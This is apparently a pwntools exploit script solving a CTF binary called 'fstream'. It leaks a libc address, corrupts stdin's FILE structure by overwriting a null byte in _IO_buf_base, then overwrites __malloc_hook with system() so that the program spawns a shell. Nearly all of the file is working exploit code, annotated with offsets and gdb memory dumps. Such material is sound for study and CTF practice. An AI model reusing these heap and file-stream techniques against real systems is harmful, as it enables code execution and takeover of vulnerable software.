#!/usr/bin/python

from pwn import *

# x64 File Stream Oriented Programming (file structure exp)
# https://dangokyo.me/2018/01/01/advanced-heap-exploitation-file-stream-oriented-programming/

#s = process('./fstream', env={'LD_PRELOAD':'./libc-2.23.so'})
s = process('./fstream')
libc = ELF('./libc-2.23.so')

#11010110
#10110101
#11111111
#libc : 0x7ffff7a0d000
#magic: __free_hook(0x3c67a8)               : 0x0000000000000000

#libc-database:
# ./find __free_hook 0x7a8
# ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
#./dump libc6_2.23-0ubuntu10_amd64
#offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045390
#offset_dup2 = 0x00000000000f7970
#offset_read = 0x00000000000f7250
#offset_write = 0x00000000000f72b0
offset_str_bin_sh = 0x18cd57
#./dump libc6_2.23-0ubuntu10_amd64 _IO_2_1_stdin_
offset__IO_2_1_stdin_ = 0x00000000003c48e0


# going into leak function
payload = '11010110' + 'A' * 300
s.sendline(payload)

print s.recvline()
print s.recvline()

s.sendline('AAA')
leak = s.recvline()[-12:-6:].strip().ljust(8, '\x00')
leak_unpacked = struct.unpack('Q', leak)[0]
print 'leak =', leak, '>', hex(leak_unpacked)  # 0x7ffff7de77cb - 0x3DA7CB = 0x7ffff7a0d000

libc.address = leak_unpacked - 0x3DA7CB

print 'libc.address =', hex(libc.address)
free_hook_addr = libc.symbols["__free_hook"]
print 'free_hook_addr =', hex(free_hook_addr)  #free_hook_addr = 0x7ffff7dd37a8


# exiting leak function
s.sendline('11111111')
s.recvuntil("> ")

'''
void __noreturn ccloud()
{
  size_t size; // [sp+18h] [bp-18h]@2
  void *buf; // [sp+20h] [bp-10h]@1
  __int64 v2; // [sp+28h] [bp-8h]@1

  v2 = *MK_FP(__FS__, 40LL);
  for ( buf = 0LL; ; free(buf) )
  {
    write(1, "> ", 2uLL);
    _isoc99_scanf("%lu", &size);  <= reading long value
    getchar();
    buf = malloc(size);
    write(1, "> ", 2uLL);
    read(0, buf, size);
    *((_BYTE *)buf + size - 1) = 0;  <== null byte exploit ( we can write null byte at the end of any address
                                         *(0 + (-0xffff80000822e6e7) - 1) = *0x7ffff7dd1918
  }
}  
'''

# going into ccloud
s.sendline('10110101')
s.recvuntil("> ")

'''
gdb-peda$ p * stdin
$1 = {
  _flags = 0xfbad208b, 
  _IO_read_ptr = 0x7ffff7dd1964 <_IO_2_1_stdin_+132> "", 
  _IO_read_end = 0x7ffff7dd1964 <_IO_2_1_stdin_+132> "", 
  _IO_read_base = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n", 
  _IO_write_base = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n", 
  _IO_write_ptr = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n", 
  _IO_write_end = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n", 
  _IO_buf_base = 0x7ffff7dd1963 <_IO_2_1_stdin_+131> "\n", 
  _IO_buf_end = 0x7ffff7dd1964 <_IO_2_1_stdin_+132> "", 
  _IO_save_base = 0x0, 
  _IO_backup_base = 0x0, 
  _IO_save_end = 0x0, 
  _markers = 0x0, 
 ...
}
'''

#gdb-peda$ x/48gx 0x7ffff7dd18e0
#0x7ffff7dd18e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dd1963  <== _flags / _IO_read_ptr
#0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:	0x00007ffff7dd1964	0x00007ffff7dd1963  <== _IO_read_end  / _IO_read_base
#0x7ffff7dd1900 <_IO_2_1_stdin_+32>:	0x00007ffff7dd1963	0x00007ffff7dd1963  <== _IO_write_base / _IO_write_ptr
#0x7ffff7dd1910 <_IO_2_1_stdin_+48>:	0x00007ffff7dd1963	0x00007ffff7dd1963  <== _IO_write_end  / _IO_buf_base  !!! scanf using it to store input 
#0x7ffff7dd1920 <_IO_2_1_stdin_+64>:	0x00007ffff7dd1964	0x0000000000000000  <== _IO_buf_end
#0x7ffff7dd1930 <_IO_2_1_stdin_+80>:	0x0000000000000000	0x0000000000000000

# overwriting last 2 bytes at address 0x7ffff7dd1918 to 00 => 0x00007ffff7dd1963 turns 0x7ffff7dd1900
# *((_BYTE *)buf + size - 1) = 0
# _IO_buf_base_addr = libc.address + 0x3c4918 = 
# = libc.address + offset__IO_2_1_stdin_ + 56 = 0x7ffff7a0d000 + 0x3c4918 = 0x7FFFF7DD1918
# 0 + (-0xffff80000822e6e7) - 1 = 0x7FFFF7DD1918
size_payload = -(0x10000000000000000- (libc.address + 0x3c4918 + 1))
#(-(0x10000000000000000- (libc.address + 0x3c4918 + 1))) = -18446603336357701353 = -0xffff80000822e6e9
print '(-(0x10000000000000000- (libc.address + 0x3c4918 + 1))) =', size_payload, '=', hex(size_payload)

#s.sendline(str(size_payload))
log.info('setting LSB of _IO_buf_base to 00...')
s.sendline(str(libc.address + 0x3c4918 + 1))
pause()

# next input will be writen at 0x7ffff7dd1900 :
#s.sendline('B' * 24)
#0x7ffff7dd18e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dd1901
#0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:	0x00007ffff7dd1919	0x00007ffff7dd1900
#0x7ffff7dd1900 <_IO_2_1_stdin_+32>:	0x4242424242424242	0x4242424242424242
#0x7ffff7dd1910 <_IO_2_1_stdin_+48>:	0x4242424242424242	0x00007ffff7dd190a <== _IO_write_end  / _IO_buf_base  !!!
#0x7ffff7dd1920 <_IO_2_1_stdin_+64>:	0x00007ffff7dd1964	0x0000000000000000
#0x7ffff7dd1930 <_IO_2_1_stdin_+80>:	0x0000000000000000	0x0000000000000000

#./dump libc6_2.23-0ubuntu10_amd64 __malloc_hook
offset___malloc_hook = 0x00000000003c4b10
malloc_hook_addr =  0x7ffff7a0d000 + 0x3c4b10 # 0x7FFFF7DD1B10
# _IO_2_1_stdin_addr + 0x83 = 0x7ffff7dd18e0 + 0x83 = 0x7FFFF7DD1963
# malloc_hook_addr - 0x10 = 0x7FFFF7DD1B00 - 0x10 = 0x7FFFF7DD1B00
# malloc_hook_addr + 0x10 = 0x7FFFF7DD1B00 + 0x10 = 0x7FFFF7DD1B20

_IO_2_1_stdin_addr = libc.address + offset__IO_2_1_stdin_


payload = p64(_IO_2_1_stdin_addr + 0x83) + p64(_IO_2_1_stdin_addr + 0x83)
payload += p64(_IO_2_1_stdin_addr + 0x83) + p64(malloc_hook_addr - 0x10)    # 0x7ffff7dd1b00 because LSB would be stil replaced to 00 anyway 
payload += p64(malloc_hook_addr + 0x10) + p64(0x0)                          # 
payload += str(libc.address + offset_str_bin_sh)                            # number for scanf to parse

'''
gdb.attach(s, """
b *ccloud + 89
b *ccloud + 164
b *ccloud
""")
'''

s.send(payload)

#gdb-peda$ x/32gx 0x7ffff7dd18e0
#0x7ffff7dd18e0 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dd1901
#0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:	0x00007ffff7dd1940	0x00007ffff7dd1900
#0x7ffff7dd1900 <_IO_2_1_stdin_+32>:	0x00007ffff7dd1963	0x00007ffff7dd1963
#0x7ffff7dd1910 <_IO_2_1_stdin_+48>:	0x00007ffff7dd1963	0x00007ffff7dd1b00
#0x7ffff7dd1920 <_IO_2_1_stdin_+64>:	0x00007ffff7dd1b20	0x0000000000000000
#0x7ffff7dd1930 <_IO_2_1_stdin_+80>:	0x3433373337303431	0x0a33323834323539

#gdb-peda$ x/32gx 0x7ffff7dd1b00
#0x7ffff7dd1b00 <__memalign_hook>:	0x00007ffff7a92e20	0x00007ffff7a92a00
#0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
#0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
#0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
#0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000

pause()

log.info('replacing malloc_hook with system address...')
s.send(p64(libc.address + offset_system) * 4)

# system_addr = libc.address + offset_system = 0x7ffff7a0d000 + 0x45390 = 0x00007ffff7a52390
#gdb-peda$ x/32gx 0x7ffff7dd1b00
#0x7ffff7dd1b00 <__memalign_hook>:	0x00007ffff7a52390	0x00007ffff7a52390
#0x7ffff7dd1b10 <__malloc_hook>:	0x00007ffff7a52390	0x00007ffff7a52390
#0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
#0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
#0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000


s.interactive()


